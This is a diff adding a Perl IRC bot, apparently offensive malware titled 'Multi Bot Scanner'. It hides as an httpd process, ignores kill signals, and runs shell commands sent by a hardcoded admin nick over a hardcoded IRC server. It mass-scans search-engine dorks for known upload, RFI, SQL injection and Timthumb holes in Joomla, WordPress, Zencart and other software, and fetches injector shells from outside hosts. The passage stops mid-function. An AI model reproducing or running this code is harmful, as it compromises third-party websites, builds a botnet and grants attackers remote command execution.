@@ -1,0 +1,2775 @@
+#!/usr/bin/perl
+
+################################################################
+##               MULTI BOT SCANNER BY KLIVERZ  			      ##
+##             CONTACT : KLIVERZ(AT)YAHOO.CO.ID               ##
+## THANKS TO : JATIMCOM, INDONESIAN CODER, KILL -9 CREW, BKHT ##
+################################################################
+use HTTP::Request;
+use HTTP::Request::Common;
+use HTTP::Request::Common qw(POST);
+use LWP::Simple;
+use LWP 5.64;
+use LWP::UserAgent;
+use Socket;
+use IO::Socket;
+use IO::Socket::INET;
+use IO::Select;
+use MIME::Base64;
+use URI::Escape;
+use Digest::MD5 qw(md5_hex);
+#use DBI;
+#use DBD::mysql;
+
+
+my $datetime = localtime;
+my $fakeproc = "/usr/sbin/httpd";
+my $ircserver = "93.191.130.153";
+my $ircport = "7000";
+my $nickname = "mad";
+my $ident = "zz";
+my $channel = "#cox";
+my $chanxxx = "#cox";
+my $chaninfo = "#cox";
+my $submitchan = "#cox";
+my $admin = "xSouL";
+my $fullname = "peler Cyber";
+my $rawmsg = $ARGV[4];
+my $msgraw = $ARGV[5];
+my $nob0dy	= "peler Cyber";
+
+my $startlogo	= "9,1[4!9]11Scanning Start 9<4=9> ";
+my $jnewslogo	= "9,1[4!9]11JNews 9<4=9> ";
+my $jcelogo	= "9,1[4!9]11JCE Finder 9<4=9> ";
+my $civicrmlogo	= "9,1[4!9]11Civicrm 9<4=9> ";
+my $jinclogo	= "9,1[4!9]11JINC 9<4=9> ";
+my $letterlogo	= "9,1[4!9]11JnewsLetter 9<4=9> ";
+my $acylogo	= "9,1[4!9]11Acymailing 9<4=9> ";
+my $maianlogo	= "9,1[4!9]11Maianmedia 9<4=9> ";
+my $redmistyclogo	= "9,1[4!9]11RedMystc 9<4=9> ";
+my $phpvmslogo	= "9,1[4!9]11PhpVms 9<4=9> ";
+my $clipbucketlogo	= "9,1[4!9]11ClipBucket 9<4=9> ";
+my $reflexlogo	= "9,1[4!9]11ReFlex Gallery 9<4=9> ";
+my $maian15logo	= "9,1[4!9]11Maian15 9<4=9> ";
+my $livecart15logo	= "9,1[4!9]11Live Cart 9<4=9> ";
+my $switchbladelogo	= "9,1[4!9]11Switchblade 9<4=9> ";
+my $coldfusionlogo	= "9,1[4!9]11Coldfusion 9<4=9> ";
+my $joomleaguelogo	= "9,1[4!9]11Joomleague 9<4=9> ";
+my $photostorelogo	= "9,1[4!9]11PhotoStore 9<4=9> ";
+my $thumblogo	= "9,1[4!9]11Timthumb 9<4=9> ";
+my $sqllogo	= "9,1[4!9]11SQL Injection 9<4=9> ";
+my $zenlogo	= "9,1[4!9]11Zencart 9<4=9> ";
+my $rfilogo	= "9,1[4!9]11RFI 9<4=9> ";
+my $pointofsalelogo	= "9,1[4!9]11point of sale 9<4=9> ";
+
+my $maian15cmd	= "!m15";
+my $livecartcmd	= "!lct";
+my $jnewscmd	= "!jne";
+my $jcecmd	= "!jce";
+my $jinccmd	= "!jinc";
+my $acycmd	= "!acy";
+my $lettercmd	= "!lett";
+my $civicrmcmd	= "!civi";
+my $maiancmd	= "!mai";
+my $redmistyccmd	= "!red";
+my $phpvmscmd	= "!vms";
+my $clipbucketcmd	= "!cbk";
+my $reflexcmd	= "!ref";
+my $switchbladecmd	= "!swb";
+my $coldfusioncmd	= "!cdf";
+my $joomleaguecmd	= "!jlg";
+my $photostorecmd	= "!pst";
+my $thumbcmd  = '!tim';
+my $sqlcmd  = '!sql';
+my $zencmd  = '!zen';
+my $rficmd  = '!rfi';
+my $ftpcmd	= "!ftp";
+my $pointofsalecmd = "!point";
+my $gps		= 1;
+my $gps2	= 1;
+my $timot	= 7;
+my $silentmode	= 0;
+my $rceinjector = "http://server1.androidroot.org/admin_area/rcex.php";
+my $thumbshell = "http://picasa.com.pueblotricolor.com/config.php";
+my $rfiinjector = "http://server1.androidroot.org/admin_area/kliverz.txt";
+my $spd = "http://server1.androidroot.org/admin_area/spd.txt";
+
+
+my $folder1    = "/cache/a27eb7108b613aef0657c6d724fdec7d.php";									
+my $folder2    = "/cache/external_a27eb7108b613aef0657c6d724fdec7d.php";								
+my $folder3    = "/temp/a27eb7108b613aef0657c6d724fdec7d.php";									
+my $folder4    = "/temp/external_a27eb7108b613aef0657c6d724fdec7d.php";								
+my $folder5    = "/wp-content/uploads/thumb-temp/a27eb7108b613aef0657c6d724fdec7d.php";
+
+my $uagent    = "Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; Windows NT 5.1; (R1 1.5); .NET CLR 2.0.50727; InfoPath.1)";
+my $jpath	= "?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
+
+my $jack1 = "http://spronk.us/search.php".$jpath;
+my $jack2 = "http://spronk.us/search.php".$jpath;
+my $jack3 = "http://spronk.us/search.php".$jpath;
+my $jack4 = "http://spronk.us/search.php".$jpath;
+my $jack5 = "http://spronk.us/search.php".$jpath;
+my $jack6 = "http://spronk.us/search.php".$jpath;
+my $jack7 = "http://spronk.us/search.php".$jpath;
+my $jack8 = "http://spronk.us/search.php".$jpath;
+my $jack9 = "http://spronk.us/search.php".$jpath;
+my $jack10 = "http://spronk.us/search.php".$jpath;
+
+my $engine	= "JacKAC,JacKAD,JacKAE,JacKAF,JacKAG,JacKAL,JacKAM,JacKAN,JacKAT,JacKAR,JacKAU,JacKBE,JacKHU,JacKOrG,JacKCoM,JacKNeT,JacKPL,JacKIT,JacKID,JacKMY,
+				JacKES,JacKUK,JacKUS,JacKJP,JacKKR,JacKDE,JacKDK,JacKCA,JacKBR,JacKRO,JacKRU,JacKNL,JacKInfO,JacKFR,JacKIN,JacKMX,JacKCZ,JacKCL,JacKUA,
+				JacKCN,JacKIR,JacKTH,JacKEU,JacKPH,JackIL,JackIM,JacKSI,JacKBIZ,GooGLe,WaLLa,YaHoo,AsK,Bing,OnEt,CLusTy,SaPo,AoL,UoL,LyCos,HotBot,BigLobe,SeZNam";
+
+
+				
+
+$SIG{'INT'}   = 'IGNORE';
+$SIG{'HUP'}   = 'IGNORE';
+$SIG{'TERM'}  = 'IGNORE';
+$SIG{'CHLD'}  = 'IGNORE';
+$SIG{'PS'}    = 'IGNORE';
+#chdir("/");
+$ircserver = "$ARGV[0]" if $ARGV[0];
+$ircport = "$ARGV[1]" if $ARGV[1];
+$nickname = "$ARGV[2]" if $ARGV[2];
+$channel = "$ARGV[3]" if $ARGV[3];
+$0 = "$fakeproc"."\0" x 16;
+my $pid = fork;
+exit if $pid;
+die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);
+
+our %irc_servers;
+our %DCC;
+my $dcc_sel = new IO::Select->new();
+$sel_client = IO::Select->new();
+sub sendraw {
+    if ($#_ == '1') {
+    my $socket = $_[0];
+    print $socket "$_[1]\n";
+    } else {
+        print $IRC_cur_socket "$_[0]\n";
+    }
+}
+sub connector {
+    my $mynick = $_[0];
+    my $ircserver_con = $_[1];
+    my $ircport_con = $_[2];
+    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
+    if (defined($IRC_socket)) {
+        $IRC_cur_socket = $IRC_socket;
+        $IRC_socket->autoflush(1);
+        $sel_client->add($IRC_socket);
+        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
+        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
+        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
+        nick("$mynick");
+        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
+        sleep(1);}}
+
+sub parse {
+    my $servarg = shift;
+    if ($servarg =~ /^PING \:(.*)/) {
+        sendraw("PONG :$1");
+    }
+    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
+        if (lc($1) eq lc($mynick)) {
+            $mynick = $4;
+            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+        }
+    }
+    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
+        nick("$mynick".int rand(99));
+    }
+    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
+        $mynick = $2;
+        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
+        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
+        sendraw("NS ID kliverz");
+        sleep(3);
+sendraw("JOIN $channel bruakakaka");
+        sendraw("PRIVMSG $admin :Hi $admin im here !!!");
+    }
+}
+
+my $line_temp;
+while( 1 ) {
+    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
+    select(undef, undef, undef, 0.01);
+    delete($irc_servers{''}) if (defined($irc_servers{''}));
+    my @ready = $sel_client->can_read(0);
+    next unless(@ready);
+    foreach $fh (@ready) {
+        $IRC_cur_socket = $fh;
+        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
+        $nread = sysread($fh, $ircmsg, 4096);
+        if ($nread == 0) {
+            $sel_client->remove($fh);
+
+            $fh->close;
+            delete($irc_servers{$fh});
+        }
+        @lines = split (/\n/, $ircmsg);
+        $ircmsg =~ s/\r\n$//;
+        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
+            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);			
+            if ($path eq $mynick) {
+				if ($msg =~ /^PING (.*)/) {
+					sendraw("NOTICE $nick :PING $1");
+				}
+				if ($msg =~ /^VERSION/) {
+					sendraw("NOTICE $nick :VERSION mIRC v6.21 Khaled Mardam-Bey");
+				}
+				if ($msg =~ /^TIME/) {
+					sendraw("NOTICE $nick :TIME ".$datetime."");
+				}
+				if (&isAdmin($nick) && $msg eq "!die") {
+					&shell("$path","kill -9 $$");
+				}
+
+				if (&isAdmin($nick) && $msg eq "!killall") {
+					&shell("$path","killall -9 perl");
+				}
+				if (&isAdmin($nick) && $msg eq "!reset") {
+					sendraw("QUIT :Restarting...");
+				}
+				if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
+					sendraw("JOIN #".$1);
+				}
+				if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
+					sendraw("PART #".$1);
+				}
+				if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
+					sendraw("NICK ".$1);
+				}
+                
+
+				if (&isAdmin($nick) && $msg =~ /^!pid/) {
+					sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
+				}
+				if (&isAdmin($nick) && $msg !~ /^!/) {
+					&shell("$nick","$msg");
+				}
+				if (&isAdmin($nick) && $msg =~ /^!raw (.+)/) {
+					sendraw("$rawmsg $msgraw ".$1);
+				}
+				if (&isAdmin($nick) && $msg =~ /^!say (.+)/) {
+					sendraw("PRIVMSG $rawmsg ".$1);
+				}
+				if (&isAdmin($nick) && $msg =~ /^!act (.+)/) {
+					sendraw("PRIVMSG $rawmsg :ACTION ".$1."");
+				}
+				
+
+
+
+				if (&isAdmin($nick) && $msg =~ /^!timot\s+(.*) -d/) {
+					$newtimot = $1;
+					$timot = $newtimot;
+					&msg("$admin","9,1 Get Content TimeOut change to4 $timot ");
+				}
+				if (&isAdmin($nick) && $msg =~ /^!chxchan\s+(.+) -d/) {
+					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+					$newchan = $1;
+					$chanxxx = $newchan;
+					&msg("$admin","9,1 xChan change to4 $chanxxx ");
+				}}}
+			}
+			else {
+				if (&isAdmin($nick) && $msg eq "!die") {
+					&shell("$path","kill -9 $$");
+				}
+				if (&isAdmin($nick) && $msg eq "!killall") {
+					&shell("$path","killall -9 perl");
+				}
+				if (&isAdmin($nick) && $msg eq "!reset") {
+					sendraw("QUIT :Restarting...");
+				}
+				if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
+					sendraw("JOIN #".$1);
+				}
+				if (&isAdmin($nick) && $msg eq "!part") {
+					sendraw("PART $path");
+				}
+				if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
+					sendraw("PART #".$1);
+				}
+				if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
+					&shell("$path","$1");
+				}
+				if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
+					&shell("$path","$1");
+				}
+				if (&isAdmin($nick) && $msg =~ /^!silent\s+(.*) -d/) {
+					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+					$smod = $1;
+				if ($smod =~ /ON/) { $silentmode = 1; $silentstat = "ON"; }
+				elsif ($smod =~ /OFF/) { $silentmode = 0; $silentstat = "OFF"; }
+					&msg("$path","9,1[4!9]Silent Mode15 $silentstat !!!!");
+				}}}
+				if ($msg=~ /^!jackx\s+(.*) -d/) {
+					$engmod = $1;
+				if ($engmod =~ /ON/) { $gps = 1; $gpsstat = "ACTIVATED"; }
+
+				elsif ($engmod =~ /OFF/) { $gps = 0; $gpsstat = "DEACTIVATED"; }
+					&msg("$path","9,1[4!9]Jack Engine15 $gpsstat !!!!");
+				}
+				if ($msg=~ /^!engine\s+(.*) -d/) {
+					$engmod = $1;
+				if ($engmod =~ /ON/) { $gps2 = 1; $gpsstat = "ACTIVATED"; }
+				elsif ($engmod =~ /OFF/) { $gps2 = 0; $gpsstat = "DEACTIVATED"; }
+					&msg("$path","9,1[4!9]Multi Engine15 $gpsstat !!!!");
+				}
+                ##################################################################### HELP COMMAND
+				if ($msg=~ /^!helsp/) {
+					my $helplogo = "9,1[4!9]15HELP 4<9=4> ";sleep(3);
+
+&msg("$path","4$helplogo 8 Multi SCANNER By Kliverz");
+			&msg("$path","4$helplogo 4 All Exploit Joomla ");
+					&msg("$path","$helplogo9Com_Maian15 :15 $maian15cmd [dork] ");
+					&msg("$path","$helplogo9Com_Redmistyc :15 $redmistyccmd [dork] "); 
+					&msg("$path","$helplogo9Com_Jnews :15 $jnewscmd [dork] ");
+					&msg("$path","$helplogo9Com_Jnewsletter :15 $lettercmd [dork] ");
+					&msg("$path","$helplogo9Com_Civicrm :15 $civicrmcmd [dork] ");
+					&msg("$path","$helplogo9Com_Maianmedia :15 $maiancmd [dork] ");
+					&msg("$path","$helplogo9Com_Acymailing :15 $acycmd [dork] ");
+					&msg("$path","$helplogo9Com_Jinc :15 $jinccmd [dork] ");
+					&msg("$path","$helplogo9Com_Joomleague :15 $joomleaguecmd [dork] ");
+					&msg("$path","$helplogo9JCE Exploit :15 $jcecmd [dork] ");
+			&msg("$path","4$helplogo 4 All Exploit Wordpress ");		
+					&msg("$path","$helplogo9ReFlex Gallery :15 $reflexcmd [dork] ");
+					&msg("$path","$helplogo9Switchblade :15 $switchbladecmd [dork] ");
+					&msg("$path","$helplogo9Cold Fusion :15 $coldfusioncmd [dork] ");
+					&msg("$path","$helplogo9Timthumb :15 $thumbcmd [Bug] [dork] ");
+			&msg("$path","4$helplogo 4 All Other Exploit ");		
+					&msg("$path","$helplogo9PhpVms :15 $phpvmscmd [dork] ");
+					&msg("$path","$helplogo9ClipBucket :15 $clipbucketcmd [dork] ");
+					&msg("$path","$helplogo9PhotoStore :15 $photostorecmd [dork] ");
+					&msg("$path","$helplogo9SQL Injection :15 $sqlcmd [dork] ");
+					&msg("$path","$helplogo9Zencart :15 $zencmd [dork] ");
+					&msg("$path","$helplogo9RFI :15 $rficmd [dork] ");
+					&msg("$path","$helplogo9Point of Sale :15 $pointofsalecmd [dork] ");
+					&msg("$path","4$helplogo 8 We are Indramayu CyBer");				
+}
+
+                if ($msg=~ /^!respon/ || $msg=~ /^!id/) {
+				    my $injectlogo = "9,1[4!9]15Inject 4<9=4> ";sleep(3);
+					
+					$inject1 = "";
+					$inject2 = "";
+					$inject3 = "";
+					
+					
+                    my $cekby1 = &get_content($rceinjector);
+					my $cekby2 = &get_content($thumbshell);
+					my $cekby3 = &get_content($rfiinjector);
+					
+					if ($cekby1 =~ /kliverz/i){ $inject1 = "9Ready!!!"; } else { $inject1 = "4Lost!!!"; }
+					if ($cekby2 =~ /GIF89a/i){ $inject2 = "9Ready!!!"; } else { $inject2 = "4Lost!!!"; }
+					if ($cekby3 =~ /bajak/i){ $inject2 = "9Ready!!!"; } else { $inject3 = "4Lost!!!"; }
+					
+			&msg("$path","4$injectlogo 8 Injector Checker ");		
+					&msg("$path","$injectlogo15RCE Injector :15 $inject1 ");
+					&msg("$path","$injectlogo15Timthumb Injector :15 $inject2 ");
+                    &msg("$path","$injectlogo15RFI Injector :15 $inject2 ");                   
+            &msg("$path","4$injectlogo 8 End Of Injector Checker ");
+                }
+
+
+                if (&isAdmin($nick) && $msg =~ /^!pid/) {
+                    &msg("$nick","6Fake Process/PID : $fakeproc - $$");
+                }
+				if (&isAdmin($nick) && $msg eq "!bypass") {
+my $bystats1 = "";
+my $bystats2 = "";
+my $bystats3 = "";
+my $bystats4 = "";
+my $bystats5 = "";
+my $bystats6 = "";
+my $bystats7 = "";
+my $bystats8 = "";
+my $bystats9 = "";
+my $bystats10 = "";
+
+my $cekby1 = &get_content($jack1."search");
+my $cekby2 = &get_content($jack2."search");					
+my $cekby3 = &get_content($jack3."search");
+my $cekby4 = &get_content($jack4."search");
+my $cekby5 = &get_content($jack5."search");
+my $cekby6 = &get_content($jack6."search");
+my $cekby7 = &get_content($jack7."search");
+my $cekby8 = &get_content($jack8."search");
+my $cekby9 = &get_content($jack9."search");
+my $cekby10 = &get_content($jack10."search");
+
+if ($cekby1 =~ /search/i){ $bystats1 = "9Up!!!"; } else { $bystats1 = "4Lost!!!"; }
+if ($cekby2 =~ /search/i){ $bystats2 = "9Up!!!"; } else { $bystats2 = "4Lost!!!"; }
+if ($cekby3 =~ /search/i){ $bystats3 = "9Up!!!"; } else { $bystats3 = "4Lost!!!"; }
+if ($cekby4 =~ /search/i){ $bystats4 = "9Up!!!"; } else { $bystats4 = "4Lost!!!"; }
+if ($cekby5 =~ /search/i){ $bystats5 = "9Up!!!"; } else { $bystats5 = "4Lost!!!"; }
+if ($cekby6 =~ /search/i){ $bystats6 = "9Up!!!"; } else { $bystats6 = "4Lost!!!"; }
+if ($cekby7 =~ /search/i){ $bystats7 = "9Up!!!"; } else { $bystats7 = "4Lost!!!"; }
+if ($cekby8 =~ /search/i){ $bystats8 = "9Up!!!"; } else { $bystats8 = "4Lost!!!"; }
+if ($cekby9 =~ /search/i){ $bystats9 = "9Up!!!"; } else { $bystats9 = "4Lost!!!"; }
+if ($cekby10 =~ /search/i){ $bystats10 = "9Up!!!"; } else { $bystats10 = "4Lost!!!"; }
+
+my $bypasslogo = "9,1[4!9]15Bypass 4<9=4> ";sleep(3);
+&msg("$path","4$bypasslogo 8 Bypass Checker ");
+         &msg("$path","$bypasslogo9JACK1 = $bystats1 ");
+		 &msg("$path","$bypasslogo9JACK2 = $bystats2 ");
+		 &msg("$path","$bypasslogo9JACK3 = $bystats3 ");
+		 &msg("$path","$bypasslogo9JACK4 = $bystats4 ");
+		 &msg("$path","$bypasslogo9JACK5 = $bystats5 ");
+		 &msg("$path","$bypasslogo9JACK6 = $bystats6 ");
+		 &msg("$path","$bypasslogo9JACK7 = $bystats7 ");
+		 &msg("$path","$bypasslogo9JACK8 = $bystats8 ");
+		 &msg("$path","$bypasslogo9JACK9 = $bystats9 ");
+		 &msg("$path","$bypasslogo9JACK10 = $bystats10 ");
+&msg("$path","4$bypasslogo 8 End Of Bypass Checker ");
+}
+##################################################################### SCAN
+				if ($msg=~ /^$thumbcmd\s+(.+?)\s+(.*)/) {
+                    if (my $pid = fork) {
+                        waitpid($pid, 0);
+                    }
+                    else {
+                        if (fork) { exit; } else {
+                            my ($bug,$dork) = ($1,$2);
+							my $simpan = $nick;
+							
+							if (&isFound($thumbshell,"GIF89")) {
+							&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Tumini di 4$path ");
+                            &msg("$path","$thumblogo9Dork $dork ");
+                            &msg("$path","$thumblogo9Bugz $bug ")
+                            &msg("$path","$thumblogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+                            &se_start($path,$bug,$simpan,$dork,$engine,1);
+							} else {
+                            &msg("$path","9,1[4!9]Injector 4<9=4>15 Lost!!! ");
+                            }
+                        }
+                        exit;
+                    }
+                }
+				
+               if ($msg =~ /^$rficmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("$1",$1);
+						my $simpan = $nick;
+						
+	 					if (&isFound($rfiinjector,"bajak")) {
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan RFI di 4$path ");
+						&msg("$path","$rfilogo9Dork $dork ");
+						&msg("$path","$rfilogo9Search Engine Now Loading ... ");
+						&msg("$path","$rfilogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,5);
+						   } else {
+                            &msg("$path","9,1[4!9]Injector 4<9=4>15 Lost!!! ");
+						}
+					}
+				}				
+			}	
+                if ($msg =~ /^$zencmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("admin/sqlpatch.php/password_forgotten.php?action=execute",$1);
+						my $simpan = $nick;
+						
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Zencart di 4$path ");
+						&msg("$path","$zenlogo9Dork $dork ");
+						&msg("$path","$zenlogo9Search Engine Now Loading ... ");
+						&msg("$path","$zenlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,10);
+						}
+					}
+				}				
+                if ($msg =~ /^$sqlcmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ($1,$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan SQL di 4$path ");
+						&msg("$path","$sqllogo9Dork $dork ");
+						&msg("$path","$sqllogo9Search Engine Now Loading ... ");
+						&msg("$path","$sqllogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,29);
+						}
+					}
+				}
+                if ($msg =~ /^$photostorecmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/assets/uploadify/old/uploadify.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan photostore di 4$path ");
+						&msg("$path","$photostorelogo9Dork $dork ");
+						&msg("$path","$photostorelogo9Search Engine Now Loading ... ");
+						&msg("$path","$photostorelogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,28);
+						}
+					}
+				}
+				
+                if ($msg =~ /^$jcecmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan JCE di 4$path ");
+						&msg("$path","$jcelogo9Dork $dork ");
+						&msg("$path","$jcelogo9Search Engine Now Loading ... ");
+						&msg("$path","$jcelogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,13);
+						}
+					}
+				}
+				
+				if ($msg =~ /^$switchbladecmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/wp-content/themes/switchblade/framework/_scripts/valums_uploader/php.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Switchblade di 4$path ");
+						&msg("$path","$switchbladelogo9Dork $dork ");
+						&msg("$path","$switchbladelogo9Search Engine Now Loading ... ");
+						&msg("$path","$switchbladelogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,25);
+						}
+					}
+				}
+
+                if ($msg =~ /^$jnewscmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan JNews di 4$path ");
+						&msg("$path","$jnewslogo9Dork $dork ");
+						&msg("$path","$jnewsogo9Search Engine Now Loading ... ");
+						&msg("$path","$jnewslogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,12);
+						}
+					}
+				}
+				if ($msg =~ /^$joomleaguecmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/components/com_joomleague/assets/classes/open-flash-chart/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan joomleague di 4$path ");
+						&msg("$path","$joomleaguelogo9Dork $dork ");
+						&msg("$path","$joomleaguelogo9Search Engine Now Loading ... ");
+						&msg("$path","$joomleaguelogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,27);
+						}
+					}
+				}
+                if ($msg =~ /^$clipbucketcmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/admin_area/charts/ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan ClipBucket di 4$path ");
+						&msg("$path","$clipbucketlogo9Dork $dork ");
+						&msg("$path","$clipbucketlogo9Search Engine Now Loading ... ");
+						&msg("$path","$clipbucketlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,19);
+						}
+					}
+				}
+                if ($msg =~ /^$pointofsalecmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/application/libraries/ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Point Of sale di 4$path ");
+						&msg("$path","$pointofsalelogo9Dork $dork ");
+						&msg("$path","$pointofsalelogo9Search Engine Now Loading ... ");
+						&msg("$path","$pointofsalelogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,30);
+						}
+					}
+				}				
+                if ($msg =~ /^$redmistyccmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan RedMistyc di 4$path ");
+						&msg("$path","$redmistyclogo9Dork $dork ");
+						&msg("$path","$redmistyclogo9Search Engine Now Loading ... ");
+						&msg("$path","$redmistyclogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,20);
+						}
+					}
+				}
+                if ($msg =~ /^$reflexcmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan ReFlex Gallery di 4$path ");
+						&msg("$path","$reflexlogo9Dork $dork ");
+						&msg("$path","$reflexlogo9Search Engine Now Loading ... ");
+						&msg("$path","$reflexlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,22);
+						}
+					}
+				}
+				
+				if ($msg =~ /^$coldfusioncmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/wp-content/themes/ColdFusion/includes/uploadify/upload_settings_image.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan Coldfusion di 4$path ");
+						&msg("$path","$coldfusionlogo9Dork $dork ");
+						&msg("$path","$coldfusionlogo9Search Engine Now Loading ... ");
+						&msg("$path","$coldfusionlogo9ATTENTION : 4Don't flood the bot.. 10OK!!!");
+						sendraw("MODE $path +m");
+						&se_start($path,$bug,$simpan,$dork,$engine,26);
+						}
+					}
+				}
+				
+                if ($msg =~ /^$mmformcmd\s+(.*)/) {
+                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+						my ($bug,$dork) = ("/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php",$1);
+						my $simpan = $nick;
+						&msg("$path","$startlogo9 Lapor 4$nick 9Lagi scan mmform di 4$path ");
+						&msg("$path","$mmformlogo9Dork $dork ");
+						&msg("$path","$mmformlogo9Search Engine Now Loading ... ");
